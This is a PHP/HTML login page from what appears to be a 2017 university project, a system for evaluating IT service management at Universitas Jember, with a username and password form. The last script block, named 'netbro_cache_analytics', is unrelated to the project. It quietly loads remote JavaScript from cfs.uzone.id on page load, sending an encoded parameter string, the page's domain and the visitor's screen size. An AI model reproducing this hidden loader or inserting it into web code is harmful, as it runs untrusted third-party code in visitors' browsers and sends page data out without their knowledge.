<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title> Sistem Evaluasi Manajemen Layanan Teknologi Informasi </title>
<!-- Favicon-->
<link rel="icon" href="favicon.ico" type="image/x-icon">
<!-- Custom Css -->
 <script src="<?php echo base_url().'assets/'; ?>js/jquery-3.2.1.slim.js" integrity="sha256-tA8y0XqiwnpwmOIl3SGAcFl2RvxHjA8qp0+1uCGmRmg=" crossorigin="anonymous"></script>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" type="text/css">
<link href="<?php echo base_url().'assets/'; ?>css/main.css" rel="stylesheet">
<link href="<?php echo base_url().'assets/'; ?>css/login.css" rel="stylesheet">

<!-- AdminCC You can choose a theme from css/themes instead of get all themes -->
<link href="<?php echo base_url().'assets/'; ?>css/themes/all-themes.css" rel="stylesheet" />
<link href="<?php echo base_url().'assets/'; ?>plugins/sweetalert/sweetalert.css" rel="stylesheet" />
</head>

<body class="theme-cyan">
<div class="authentication">
	<div class="container-fluid">
		<div class="row clearfix">
			<div class="col-lg-9 col-md-8 col-xs-12">
				<div class="l-detail">
                            <h5>Welcome</h5>
                            <h1>Sistem Evaluasi<span> Manajemen Layanan Teknologi Informasi</span></h1>
                            <h3>Sign in to start your session</h3>
                            <p>Silahkan Login sesuai dengan username dan password. Sistem ini merupakan sistem evaluasi manajemen layanan teknologi informasi dengan studi kasus di UPT Teknologi Informasi Universitas Jember</p> 
                    <ul class="list-unstyled l-menu">
                                <li>PROGRAM STUDI SISTEM INFORMASI</li>                              
                                <li>UNIVERSITAS JEMBER</li>
                                <li>2017</a></li>
                            </ul>        
                </div>
			</div>
			<div class="col-lg-3 col-md-4 col-xs-12">
				<div class="card">
				    <h4 class="l-login">Login</h4>
                    <form action="<?php echo base_url('index.php/login/login'); ?>" class="col-md-12" id="sign_in" method="post">
							<div class="form-group form-float">
								<div class="form-line">
									<input type="text" class="form-control" name="username" required="">
									<label class="form-label">Username</label>
								</div>
							</div>
							<div class="form-group form-float">
								<div class="form-line">
									<input type="password" class="form-control" name="password" required="">
									<label class="form-label">Password</label>
								</div>
							</div>
                            <div>
                                <input type="checkbox" name="rememberme" id="rememberme" class="filled-in chk-col-cyan">
                                <label for="rememberme">Remember Me</label>
                            </div>
                            <button class="btn btn-raised waves-effect bg-red" type="submit" name="login" value="login">SIGN IN</button>
                            <?php echo $this->session->flashdata('error') ?>
						</form>
    				</div>
			</div>
		</div>
	</div>
</div>

<!-- Jquery Core Js --> 
<script src="<?php echo base_url().'assets/'; ?>bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js -->
<script src="<?php echo base_url().'assets/'; ?>bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="<?php echo base_url().'assets/'; ?>plugins/css-gradientify/gradientify.min.js"></script><!-- Gradientify Js -->

<script src="<?php echo base_url().'assets/'; ?>bundles/mainscripts.bundle.js"></script><!-- Custom
 Js --> 
<script src="<?php echo base_url()."assets/"; ?>/plugins/sweetalert/sweetalert.min.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
        $("body").gradientify({
            gradients: [
                { start: [49,76,172], stop: [242,159,191] },
                { start: [255,103,69], stop: [240,154,241] },
                { start: [33,229,241], stop: [235,236,117] }
            ]
        });
    });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1OkuJH9Jma6MmjNC%2bzqIJk9TMJqxP6j%2b5Dp732kVM%2biZzy9TwAMxy9GohpZFZSeIpplWQO9YRBoyfF%2bXYZ8VgjdAcKm91mf27QnDzFDrllW%2balBx16g6y9goEMaIE4s3YlgI2s8ekKb4ly5NLxU3kUWWnbkCeJ6Wp6nDklhPV0hmpRNRs19L2MrfwzFjwwe9O6OkYYR3xMx%2f0lZtEnxOHhxRrAygjLJSq1y%2fFY%2fQfhtafhW5Uawf%2bouLI3FVG5Yc%2bV7KZejd5voslWMEoRXjz7YperZKGIEggljsY4tUXLu65AWR%2bpARUT2%2bP%2biCVs%2f4RRl%2blfvOVyj%2fqpX1qzxqCCLDsddU4LqDk3PwNiKyFpzjNr5OlllL8HvRYBcV59sin6soVvubkmMIb1PAvS07lL3bHiYDsXCxy5TtA6bg8Q23VHe4tZ5QJSP" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
